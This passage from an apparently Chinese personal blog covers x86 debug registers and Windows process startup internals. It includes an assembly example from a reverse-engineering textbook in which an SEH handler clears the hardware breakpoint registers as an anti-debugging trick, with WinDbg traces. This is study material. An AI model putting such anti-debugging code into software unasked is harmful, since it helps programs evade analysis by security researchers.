<p>Note that when paging is enabled, different tasks may have different linear-to-physical address mappings. When this is the case, an address in a debug address register may be relevant to one task but not to another. For this reason the x86 has both global and local enable bits in DR7. These bits indicate whether a given debug address has a global (all tasks) or local (current task only) relevance.</p>
<hr>
<h3 id="D6"><a href="#D6" class="headerlink" title="D6"></a>D6</h3><hr>
<p>The debug status register permits the debugger to determine which debug conditions have occurred. When the processor detects an enabled debug exception, it sets the low-order bits of this register (0,1,2,3) before entering the <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)#INT_3">debug exception handler</a>.</p>
<p>Note that the bits of DR6 are never cleared by the processor. To avoid any confusion in identifying the next debug exception, the debug handler should move zeros to DR6 immediately before returning.</p>
<hr>
<h3 id="D7"><a href="#D7" class="headerlink" title="D7"></a>D7</h3><hr>
<p>The low-order eight bits of DR7 (0,2,4,6 and 1,3,5,7) selectively enable the four address breakpoint conditions. There are two levels of enabling: the local (0,2,4,6) and global (1,3,5,7) levels. The local enable bits are automatically reset by the processor at every task switch to avoid unwanted breakpoint conditions in the new task. The global enable bits are not reset by a task switch; therefore, they can be used for conditions that are global to all tasks.</p>
<p>Bits 16-17 (DR0), 20-21 (DR1), 24-25 (DR2), 28-29 (DR3), define when breakpoints trigger. Each breakpoint has a two-bit entry that specifies whether they break on execution (00b), data write (01b), data read or write (11b). 10b is defined to mean break on IO read or write but no hardware supports it.[<em><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed">citation needed</a></em>] Bits 18-19 (DR0), 22-23 (DR1), 26-27 (DR2), 30-31 (DR3), define how large an area of memory is watched by breakpoints. Again each breakpoint has a two-bit entry that specifies whether they watch one (00b), two (01b), eight (10b)[<a href="https://en.wikipedia.org/wiki/X86_debug_register#cite_note-1">1]</a> or four (11b) bytes.[<a href="https://en.wikipedia.org/wiki/X86_debug_register#cite_note-2">2]</a></p>
<hr>
<p>D7有点难看懂，所以我自己尝试总结一下</p>
<pre class="line-numbers language-none"><code class="language-none">;******************************************
;coded by Hume,2K+
;《加密与解密（第四版）》
;(c)  看雪学院 www.kanxue.com 2000-2018
;******************************************
;例子1.演示在SEH回调函数中清空Dr寄存器以达到反调试的目的
;******************************************
include ..\asminc.h
;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;

	.DATA
Text           db &quot;SEH程序没有运行!&quot;,0
TextSEH        db &quot;Hello,SEH!&quot;,0
Caption        db &quot;SEH&quot;,0
	.DATA?
	
.code
_start:
assume fs:nothing
;------------------------------------------------
        push	offset _except_handler
        push	fs:[0]       
        mov	fs:[0],esp  
;---------------------------------------------------
	    mov	esi,0
	    mov	eax,[esi]		
 WouldBeOmit:                                  
   	    invoke  MessageBox,0,addr Text,addr Caption,MB_OK  ; 这一句永远无法被执行
;---------------------------------------------------
ExecuteHere:                           
   	    invoke   MessageBox,0,addr TextSEH,addr Caption,MB_OK
;--------------------------------------------------
    	    pop     fs:[0]                      
    	    add     esp,4 
    	    invoke  ExitProcess,NULL        
;-------------------------------------------------
_except_handler proc uses ebx pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD
        mov  	  eax,pContext 
        Assume  eax:ptr CONTEXT
        lea      ebx, ExecuteHere  	
        mov     [eax].regEip,ebx  	
        xor      ebx,ebx
        mov     [eax].iDr0,ebx    	
        mov     [eax].iDr1,ebx
        mov     [eax].iDr2,ebx
        mov     [eax].iDr3,ebx
        mov     [eax].iDr7,341     
        mov     eax,0            	
        ret                     
_except_handler endp
end _start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ba e1 401000<br>ba r2 40107e</p>
<table>
<thead>
<tr>
<th>DR0…DR7</th>
<th>Values</th>
</tr>
</thead>
<tbody><tr>
<td>DR0</td>
<td><em><strong>401000</strong></em></td>
</tr>
<tr>
<td>DR1</td>
<td><em><strong>40107e</strong></em></td>
</tr>
<tr>
<td>DR2</td>
<td>0</td>
</tr>
<tr>
<td>DR3</td>
<td>0</td>
</tr>
<tr>
<td>DR6</td>
<td><em><strong>ffff4ff0</strong></em></td>
</tr>
<tr>
<td>DR7</td>
<td><em><strong>700105</strong></em></td>
</tr>
</tbody></table>
<p>Dr7 |－－－－－－－－－－－－－－－－|－－－－－－－－－－－－－－－－|</p>
<p>7 0 0 1 0 5h &#x3D; 111 0000 0000 0001 0000 0101b</p>
<p>Dr7 (high)|0 0 0 0 0 0 0 0 <em>0 1</em> <strong>1 1</strong> <em>0 0</em> <strong>0 0</strong>|0 0 0 0 0 0 0 1 0 0 0 0 0 1 0 1|(low)</p>
<p>16-17bits —&gt;DR0—&gt;00—&gt;execution<br>18-19bits —&gt;DR0—&gt;00—&gt;one bytes</p>
<p>20-21bits —&gt;DR1—&gt;11—&gt;data read or write<br>22-23bits —&gt;DR1—&gt;01—&gt;two bytes</p>
<pre class="line-numbers language-none"><code class="language-none">0:000&gt; bp ntdll!KiUserExceptionDispatcher
0:000&gt; gn
Breakpoint 2 hit
eax&#x3D;0019ffcc ebx&#x3D;00364000 ecx&#x3D;00401000 edx&#x3D;00401000 esi&#x3D;00401000 edi&#x3D;00401000
eip&#x3D;772242b0 esp&#x3D;0019fa34 ebp&#x3D;0019ff80 iopl&#x3D;0         nv up ei pl zr na pe nc
cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00000246
ntdll!KiUserExceptionDispatcher:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">0:000&gt; dd esp
0:000&gt; dt _CONTEXT 0019fa8c
ntdll!_CONTEXT
   +0x000 ContextFlags     : 0x1007f
   +0x004 Dr0              : 0x401000
   +0x008 Dr1              : 0x40107e
   +0x00c Dr2              : 0
   +0x010 Dr3              : 0
   +0x014 Dr6              : 0xffff4ff0
   +0x018 Dr7              : 0x700105
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : 0x2b
   +0x090 SegFs            : 0x53
   +0x094 SegEs            : 0x2b
   +0x098 SegDs            : 0x2b
   +0x09c Edi              : 0x401000
   +0x0a0 Esi              : 0x401000
   +0x0a4 Ebx              : 0x364000
   +0x0a8 Edx              : 0x401000
   +0x0ac Ecx              : 0x401000
   +0x0b0 Eax              : 0x19ffcc
   +0x0b4 Ebp              : 0x19ff80
   +0x0b8 Eip              : 0x401013
   +0x0bc SegCs            : 0x23
   +0x0c0 EFlags           : 0x246
   +0x0c4 Esp              : 0x19ff6c
   +0x0c8 SegSs            : 0x2b
   +0x0cc ExtendedRegisters : [512]  &quot;???&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>从中可见context已经封装了dr0…dr7</p>
<pre class="line-numbers language-none"><code class="language-none">0:000&gt; bp 401080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>我在handler的返回的地方下了一个断点，看看seh执行完是否修改了调试寄存器</p>
<pre class="line-numbers language-none"><code class="language-none">0:000&gt; g
Breakpoint 3 hit
eax&#x3D;00000000 ebx&#x3D;00000000 ecx&#x3D;00401051 edx&#x3D;77238e90 esi&#x3D;00000000 edi&#x3D;00000000
eip&#x3D;00401080 esp&#x3D;0019f938 ebp&#x3D;0019f958 iopl&#x3D;0         nv up ei pl zr na pe nc
cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00000246
ClearDr+0x1080:
00401080 c21000          ret     10h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">0:000&gt; dt _CONTEXT 0019fa8c
ntdll!_CONTEXT
   +0x000 ContextFlags     : 0x1007f
   +0x004 Dr0              : 0
   +0x008 Dr1              : 0
   +0x00c Dr2              : 0
   +0x010 Dr3              : 0
   +0x014 Dr6              : 0xffff4ff0
   +0x018 Dr7              : 0x155
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : 0x2b
   +0x090 SegFs            : 0x53
   +0x094 SegEs            : 0x2b
   +0x098 SegDs            : 0x2b
   +0x09c Edi              : 0x401000
   +0x0a0 Esi              : 0x401000
   +0x0a4 Ebx              : 0x364000
   +0x0a8 Edx              : 0x401000
   +0x0ac Ecx              : 0x401000
   +0x0b0 Eax              : 0x19ffcc
   +0x0b4 Ebp              : 0x19ff80
   +0x0b8 Eip              : 0x40102d
   +0x0bc SegCs            : 0x23
   +0x0c0 EFlags           : 0x246
   +0x0c4 Esp              : 0x19ff6c
   +0x0c8 SegSs            : 0x2b
   +0x0cc ExtendedRegisters : [512]  &quot;???&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>context中封装的调试寄存器和eip被改了，如果恢复执行的话，在上级函数的<strong>帮助</strong>下这些修改就会成真，所以这操作挺骚的。<del>不过也显而易见有缺陷。</del></p>
<hr>
<p>第八章的异常处理勉强看完，有点爽。</p>
<h4 id="mark-VEH-HOOK，SEH-HOOK，各种HOOK。"><a href="#mark-VEH-HOOK，SEH-HOOK，各种HOOK。" class="headerlink" title="mark:VEH HOOK，SEH HOOK，各种HOOK。"></a>mark:VEH HOOK，SEH HOOK，各种HOOK。</h4>]]></content>
      <categories>
        <category>Windbg</category>
        <category>Anti-debug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>anti-debug</tag>
        <tag>windbg</tag>
      </tags>
  </entry>
  <entry>
    <title>marked-book</title>
    <url>/2020/09/28/marked_book/</url>
    <content><![CDATA[<h1 id="windows-system"><a href="#windows-system" class="headerlink" title="windows system"></a>windows system</h1><h2 id="Windows内核原理与实现"><a href="#Windows内核原理与实现" class="headerlink" title="Windows内核原理与实现"></a><a href="https://book.douban.com/subject/4719159//">Windows内核原理与实现</a></h2><h2 id="Windows-内核设计思想"><a href="#Windows-内核设计思想" class="headerlink" title="Windows 内核设计思想"></a><a href="https://book.douban.com/subject/26317389/">Windows 内核设计思想</a></h2><h1 id="DirectX12"><a href="#DirectX12" class="headerlink" title="DirectX12"></a>DirectX12</h1><h2 id="introduction-to-3d-game-programming-with-directx-12"><a href="#introduction-to-3d-game-programming-with-directx-12" class="headerlink" title="introduction to 3d game programming with directx 12"></a><a href="https://www.amazon.com/Introduction-3D-Game-Programming-DirectX/dp/1942270062">introduction to 3d game programming with directx 12</a></h2>]]></content>
      <categories>
        <category>books</category>
      </categories>
      <tags>
        <tag>mark</tag>
        <tag>book</tag>
      </tags>
  </entry>
  <entry>
    <title>进程/线程 的实际入口</title>
    <url>/2020/09/28/thread_process_loader/</url>
    <content><![CDATA[<h1 id="进程-x2F-线程-的实际入口"><a href="#进程-x2F-线程-的实际入口" class="headerlink" title="进程&#x2F;线程 的实际入口"></a>进程&#x2F;线程 的实际入口</h1><p>我之前会以为。进程装载，就只是是创建一块内存，然后把程序映射到这块内存，然后初始化寄存器等，再把 pc 设置到 pe 中的 enter point 中。</p>
<p>很显然我之前犯了形而上学的错误，认识应该是递进的，把细节忽略了然后自以为是的进行总结，结果就是学的不深入，学了和没学似的。</p>
<p>这是一个可以从软件讲到操作系统，再从操作系统讲到硬件，再回到软件的一个复杂的过程，虽然 windows 是闭源的。</p>
<p>为了分析 windows 创建进程的过程，首先要讲清楚一些数据结构和 windows api 的一些<a href="http://www.thehackerdev.com/posts/2020/09/windows-api-function-naming-convention/">命名方式</a></p>
<pre class="line-numbers language-none"><code class="language-none">windows api name convention

Prefix	Description
Alpc	Advanced Local Procedure Calls
Cc	Common Cache
Cm	Configuration manager
Dbg	Kernel debug support
Dbgk	Debugging Framework for user mode
Em	Errata manager
Etw	Event Tracing for Windows
Ex	Executive support routines
FsRtl	File System Runtime Library
Hv	Hive library
Hvl	Hypervisor library
Io	I&#x2F;O manager
Kd	Kernel debugger
Ke	Kernel
Kse	Kernel Shim Engine
Lsa	Local Security Authority
Mm	Memory manager
Nt	NT system services (accessible from user mode through system calls)
Ob	Object manager
Pf	Prefetcher
Po	Power manager
PoFx	Power framework
Pp	PnP manager
Ppm	Processor power manager
Ps	Process support
Rtl	Run time library
Se	Security Reference Monitor
Sm	Store Manager
Tm	Transaction manager
Ttm	Terminal timeout manager
Vf	Driver Verifier
Vsl	Virtual Secure Mode library
Wdi	Windows Diagnostic Infrastructure
Wfp	Windows FingerPrint
Whea	Windows Hardware Error Architecture
Wmi	Windows Management Instrumentation
Zw	Mirror entry point for system services (beginning with Nt) that sets previous access mode to kernel, which eliminates parameter validation, because Nt system services validate parameters only if previous access mode is user.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从 ntdll!RtlUserThreadStart 开始分析</p>
<p>ntdll!RtlUserThreadStart （ ntdll version 10.0.22000.527 ）</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ntdll!RtlUserThreadStart:
4883ec78             sub     rsp, 78h
4c8bc9               mov     r9, rcx   # rcx 值为 entrypoint
488b05f2531700       mov     rax, qword ptr [ntdll!Kernel32ThreadInitThunkFunction (00007ffd&#96;b7259c30)]
4885c0               test    rax, rax
741a                 je      ntdll!RtlUserThreadStart+0x2d (00007ffd&#96;b70e485d)
49ba7003d17ea7bfe589 mov     r10, 89E5BFA77ED10370h
4c8bc2               mov     r8, rdx
488bd1               mov     rdx, rcx
33c9                 xor     ecx, ecx
ff15b5e71800         call    qword ptr [ntdll!_guard_xfg_dispatch_icall_fptr (00007ffd&#96;b7273010)]
eb2a                 jmp     ntdll!RtlUserThreadStart+0x57 (00007ffd&#96;b70e4887)
49ba70535218429f5d94 mov     r10, 945D9F4218525370h
488bca               mov     rcx, rdx
498bc1               mov     rax, r9
ff159de71800         call    qword ptr [ntdll!_guard_xfg_dispatch_icall_fptr (00007ffd&#96;b7273010)]
8bc8                 mov     ecx, eax
e826000000           call    ntdll!RtlExitUserThread (00007ffd&#96;b70e48a0)
90                   nop     
8bd0                 mov     edx, eax
4883c9ff             or      rcx, 0FFFFFFFFFFFFFFFFh
e83af40900           call    ntdll!NtTerminateProcess (00007ffd&#96;b7183cc0)
90                   nop     
4883c478             add     rsp, 78h
c3                   ret     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>检测 Kernel32ThreadInitThunkFunction（rax） 非 0 之后跳转到 ntdll!guard_xfg_dispatch_icall_nop ，再跳转到 ntdll!guard_dispatch_icall_nop ，通过 jmp rax，跳到初始化函数 KERNEL32!BaseThreadInitThunk </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
a1 是在 ntdll!RtlUserThreadStart 中初始化为 0 的，这里（ if(!a1) ）做安全检测
*/</span>
__int64 __fastcall <span class="token function">BaseThreadInitThunk</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  NTSTATUS inited<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    inited <span class="token operator">=</span> <span class="token function">BaseThreadInitXfgThunk</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">RtlExitUserThread</span><span class="token punctuation">(</span>inited<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__debugbreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">RtlGetSuiteMask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">BasepInitializeTermsrvFpns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>KERNEL32!BaseThreadInitXfgThunk 直接跳转到 rdx 上，rdx 之前被 rcx 赋值为程序的 entrypoint，用户程序正式开始。</p>
<p><del>分析是从 ntdll!RtlUserThreadStart 开始的，显然环境以及初始化过了，下面就是分析初始化的过程。<br>通过 api monitor，找到第一个系统调用 NtQueryVolumeInformationFile ( 0x0000000000000058, 0x00000047d01fec50, 0x00000047d01fec70, 8, FileFsDeviceInformation )，windbg 跟踪。</del></p>
<p>从 CreateProcess 分析<br>调用链<br>CreateProcessW-&gt;KERNEL32!CreateProcessAStub-&gt;KERNELBASE!CreateProcessA-&gt;CreateProcessInternalA-&gt;KERNELBASE!Basep8BitStringToDynamicUnicodeString + KERNELBASE!CreateProcessInternalW-&gt;</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">KERNELBASE!memset
KERNELBASE!memset
KERNELBASE!IsProcessInJob
KERNELBASE!BaseFormatObjectAttributes
KERNELBASE!BaseFormatObjectAttributes
qword ptr [KERNELBASE!_imp_RtlFreeUnicodeString (00007ffd&#96;b4b0c490)]
KERNELBASE!IsBaseCheckElevationPresent
qword ptr [KERNELBASE!_imp_BasepFreeAppCompatData (00007ffd&#96;b4c14608)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepReleaseSxsCreateProcessUtilityStruct (00007ffd&#96;b4c14610)]
 KERNELBASE!memset
 KERNELBASE!BasepFreeBnoIsolationParameter
 qword ptr [KERNELBASE!_imp_RtlAllocateHeap
 qword ptr [KERNELBASE!_imp_RtlGetExePath
 KERNELBASE!SearchPathW (00007ffd&#96;b492a470)
 KERNELBASE!GetFileAttributesW
 qword ptr [KERNELBASE!_imp_RtlDosPathNameToNtPathName_U (00007ffd&#96;b4b0c570)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeStringEx (00007ffd&#96;b4b0cb40)]
 qword ptr [KERNELBASE!_imp_RtlDetermineDosPathNameType_U (00007ffd&#96;b4b0c6c8)]
 KERNELBASE!BasepAdjustApplicationPath
 qword ptr [KERNELBASE!_imp_GetEmbeddedImageMitigationPolicy (00007ffd&#96;b4c14010)]
 KERNELBASE!memset
 qword ptr [KERNELBASE!_imp_RtlWow64GetProcessMachines (00007ffd&#96;b4b0d7e8)]
 KERNELBASE!BasepCreateProcessParameters
 KERNELBASE!QueryChpeConfiguration
 qword ptr [KERNELBASE!_imp_NtCreateUserProcess
 qword ptr [KERNELBASE!_imp_RtlDestroyProcessParameters (00007ffd&#96;b4b0cf20)]
 qword ptr [KERNELBASE!_imp_RtlAllocateHeap (00007ffd&#96;b4b0da50)]
 qword ptr [KERNELBASE!_imp_LdrQueryImageFileKeyOption (00007ffd&#96;b4b0d818)]
 qword ptr [KERNELBASE!_imp_RtlFreeHeap (00007ffd&#96;b4b0cba0)]
 qword ptr [KERNELBASE!_imp_LdrQueryImageFileKeyOption (00007ffd&#96;b4b0d818)]
 KERNELBASE!LoadAppExecutionAliasInfoForExecutable
 call    KERNELBASE!ValidateAppExecutionAliasRedirectPackageIdentity
 KERNELBASE!BuildAppExecutionAliasCommandLine
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeString (00007ffd&#96;b4b0c498)]
 qword ptr [KERNELBASE!_imp_NtClose (00007ffd&#96;b4b0cb48)]
 qword ptr [KERNELBASE!_imp_RtlFreeHeap (00007ffd&#96;b4b0cba0)]
 qword ptr [KERNELBASE!_imp_RtlFreeUnicodeString (00007ffd&#96;b4b0c490)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepFreeAppCompatData (00007ffd&#96;b4c14608)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepReleaseSxsCreateProcessUtilityStruct (00007ffd&#96;b4c14610)]
 KERNELBASE!memset
 KERNELBASE!BasepFreeBnoIsolationParameter
 qword ptr [KERNELBASE!_imp_RtlDosPathNameToNtPathName_U (00007ffd&#96;b4b0c570)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeStringEx (00007ffd&#96;b4b0cb40)]
 qword ptr [KERNELBASE!_imp_RtlDetermineDosPathNameType_U (00007ffd&#96;b4b0c6c8)]
 KERNELBASE!BasepAdjustApplicationPath
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BasepAppXExtension (00007ffd&#96;b4c14618)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeString (00007ffd&#96;b4b0c498)]
 qword ptr [KERNELBASE!_imp_RtlInitUnicodeString (00007ffd&#96;b4b0c498)]
 KERNELBASE!memset
 ...
 qword ptr [KERNELBASE!_imp_NtCreateUserProcess
 ...
 qword ptr [KERNELBASE!_imp_NtAllocateVirtualMemory (00007ffd&#96;b4b0d308)]
 qword ptr [KERNELBASE!_imp_NtWriteVirtualMemory (00007ffd&#96;b4b0d300)]
 KERNELBASE!IsBaseCheckElevationPresent
 qword ptr [KERNELBASE!_imp_BaseElevationPostProcessing (00007ffd&#96;b4c145e8)]
 qword ptr [KERNELBASE!_imp_BasepPostSuccessAppXExtension (00007ffd&#96;b4c145e0)]
 KERNELBASE!BasepUpdateProcessParametersField
 qword ptr [KERNELBASE!_imp_CompleteAppExecutionAliasProcessCreationEx (00007ffd&#96;b4c14268)]
 qword ptr [KERNELBASE!_imp_NtResumeThread (00007ffd&#96;b4b0d648)]
 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h1 id="OLD"><a href="#OLD" class="headerlink" title="OLD"></a>OLD</h1><p>windows visata之后线程的实际入口是ntdll!RtlUserThreadStart,我下了一个断点发现win10也是这样，只不过具体实现有些区别，本来我是打算一路找回去看看是不是能找到ntdll!RtlUserThreadStart这个函数的，不过应该要挺久，下次试试2333。单纯为了验证一下线程入口点，于是我就下断看了一下。</p>
<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a><strong>fastcall</strong></h2><p>一个函数在调用时，前四个<strong>参数</strong>是从左至右依次存放于RCX、RDX、R8、R9<strong>寄存器</strong>里面，剩下的<strong>参数</strong>从右至左<strong>顺序</strong>入栈； 栈的增长方向为从高地址到低地址。</p>
<h2 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h2><p>The <strong>x</strong> command displays the symbols in all contexts that match the specified pattern.<br>常用来匹配符号。</p>
<h2 id="windows-关键数据结构及其用法"><a href="#windows-关键数据结构及其用法" class="headerlink" title="windows 关键数据结构及其用法"></a>windows 关键数据结构及其用法</h2><p>直接看 x64 下的</p>
<h3 id="PEB"><a href="#PEB" class="headerlink" title="_PEB"></a>_PEB</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dt _PEB
ntdll!_PEB
   <span class="token operator">+</span>0x000 InheritedAddressSpace : UChar
   <span class="token operator">+</span>0x001 ReadImageFileExecOptions : UChar
   <span class="token operator">+</span>0x002 BeingDebugged    : UChar
   <span class="token operator">+</span>0x003 BitField         : UChar
   <span class="token operator">+</span>0x003 ImageUsesLargePages : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsProtectedProcess : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsImageDynamicallyRelocated : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 SkipPatchingUser32Forwarders : Pos 3<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsPackagedProcess : Pos 4<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsAppContainer   : Pos 5<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsProtectedProcessLight : Pos 6<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x003 IsLongPathAwareProcess : Pos 7<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x004 Padding0         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x008 Mutant           : Ptr64 Void
   <span class="token operator">+</span>0x010 ImageBaseAddress : Ptr64 Void
   <span class="token operator">+</span>0x018 Ldr              : Ptr64 _PEB_LDR_DATA
   <span class="token operator">+</span>0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS
   <span class="token operator">+</span>0x028 SubSystemData    : Ptr64 Void
   <span class="token operator">+</span>0x030 ProcessHeap      : Ptr64 Void
   <span class="token operator">+</span>0x038 FastPebLock      : Ptr64 _RTL_CRITICAL_SECTION
   <span class="token operator">+</span>0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER
   <span class="token operator">+</span>0x048 IFEOKey          : Ptr64 Void
   <span class="token operator">+</span>0x050 CrossProcessFlags : Uint4B
   <span class="token operator">+</span>0x050 ProcessInJob     : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessInitializing : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessUsingVEH  : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessUsingVCH  : Pos 3<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessUsingFTH  : Pos 4<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessPreviouslyThrottled : Pos 5<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessCurrentlyThrottled : Pos 6<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ProcessImagesHotPatched : Pos 7<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x050 ReservedBits0    : Pos 8<span class="token punctuation">,</span> 24 Bits
   <span class="token operator">+</span>0x054 Padding1         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x058 KernelCallbackTable : Ptr64 Void
   <span class="token operator">+</span>0x058 UserSharedInfoPtr : Ptr64 Void
   <span class="token operator">+</span>0x060 SystemReserved   : Uint4B
   <span class="token operator">+</span>0x064 AtlThunkSListPtr32 : Uint4B
   <span class="token operator">+</span>0x068 ApiSetMap        : Ptr64 Void
   <span class="token operator">+</span>0x070 TlsExpansionCounter : Uint4B
   <span class="token operator">+</span>0x074 Padding2         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x078 TlsBitmap        : Ptr64 _RTL_BITMAP
   <span class="token operator">+</span>0x080 TlsBitmapBits    : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Uint4B
